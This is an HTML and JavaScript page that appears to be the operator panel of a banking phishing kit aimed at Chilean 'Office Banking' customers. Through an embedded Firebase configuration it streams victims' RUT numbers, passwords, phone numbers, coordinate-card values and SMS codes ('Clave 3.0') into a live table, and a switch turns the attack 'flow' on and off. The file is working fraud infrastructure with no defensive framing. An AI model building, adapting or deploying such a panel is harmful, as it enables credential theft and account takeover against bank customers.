
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Panel en Vivo - Control y Registros</title>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
  <style>
    body {
      font-family: sans-serif;
      padding: 20px;
      background: #f9f9f9;
    }
    h2 {
      color: #444;
    }
    .switch-container {
      margin-bottom: 20px;
    }
    .switch-label {
      font-weight: bold;
      margin-right: 10px;
    }
    .switch {
      position: relative;
      display: inline-block;
      width: 50px;
      height: 24px;
    }
    .switch input {
      opacity: 0;
      width: 0;
      height: 0;
    }
    .slider {
      position: absolute;
      cursor: pointer;
      top: 0; left: 0;
      right: 0; bottom: 0;
      background-color: #ccc;
      transition: .4s;
      border-radius: 24px;
    }
    .slider:before {
      position: absolute;
      content: "";
      height: 18px; width: 18px;
      left: 3px; bottom: 3px;
      background-color: white;
      transition: .4s;
      border-radius: 50%;
    }
    input:checked + .slider {
      background-color: #d32f2f;
    }
    input:checked + .slider:before {
      transform: translateX(26px);
    }
    table {
      border-collapse: collapse;
      width: 100%;
      background: white;
      box-shadow: 0 0 5px rgba(0,0,0,0.1);
    }
    th, td {
      border: 1px solid #ccc;
      padding: 8px 10px;
      text-align: left;
      font-size: 14px;
    }
    th {
      background-color: #d32f2f;
      color: white;
    }
    tr:nth-child(even) {
      background-color: #f2f2f2;
    }
  </style>
</head>
<body>
  <h2>Panel de Control y Registros en Vivo</h2>

  <div class="switch-container">
    <label class="switch-label">Flujo activo:</label>
    <label class="switch">
      <input type="checkbox" id="modoSwitch">
      <span class="slider"></span>
    </label>
  </div>

  <table id="tabla">
    <thead>
      <tr>
        <th>Fecha y Hora</th>
        <th>RUT</th>
        <th>Contraseña</th>
        <th>Teléfono</th>
        <th>Coordenadas</th>
        <th>Clave 3.0</th>
      </tr>
    </thead>
    <tbody></tbody>
  </table>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
      authDomain: "formulario-officebanking.firebaseapp.com",
      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
      projectId: "formulario-officebanking",
      storageBucket: "formulario-officebanking.appspot.com",
      messagingSenderId: "604053438195",
      appId: "1:604053438195:web:188de91bee9a62f0d3c186"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const refRegistros = db.ref("registros");
    const refPanel = db.ref("estado_panel");

    // Mostrar registros en tabla
    refRegistros.on("child_added", snapshot => {
      const data = snapshot.val();
      const row = document.createElement("tr");
      row.innerHTML = `
        <td>${data.fecha || ""}</td>
        <td>${data.rut || ""}</td>
        <td>${data.clave || ""}</td>
        <td>${data.telefono || ""}</td>
        <td>${data.coordenadas || ""}</td>
        <td>${data.clave_sms || ""}</td>
      `;
      document.querySelector("#tabla tbody").prepend(row);
    });

    // Leer estado inicial del switch
    refPanel.child("modo").on("value", snap => {
      document.getElementById("modoSwitch").checked = snap.val() === "activo";
    });

    // Cambiar el estado desde el switch
    document.getElementById("modoSwitch").addEventListener("change", (e) => {
      const estado = e.target.checked ? "activo" : "inactivo";
      refPanel.child("modo").set(estado);
    });
  </script>
</body>
</html>
